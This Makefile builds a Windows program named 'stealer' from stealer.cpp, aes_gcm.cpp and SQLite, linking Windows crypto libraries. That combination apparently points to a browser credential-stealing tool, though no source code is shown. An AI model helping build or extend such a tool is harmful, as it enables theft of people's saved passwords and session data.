CC=gcc
CXX=g++
LDFLAGS= -lshell32  -lshlwapi -lcrypt32 -lbcrypt -municode
PDB=-g
BIN=bin
ifeq ($(OS),Windows_NT)
	RM=powershell /c rm
else
	RM=rm
endif

all: stealer

# run sqlite3 before 
stealer: stealer.cpp aes_gcm.cpp sqlite3.o
	$(CXX) -o $@ $^ $(LDFLAGS)

clean:
	$(RM) *.exe 
	$(RM) *.o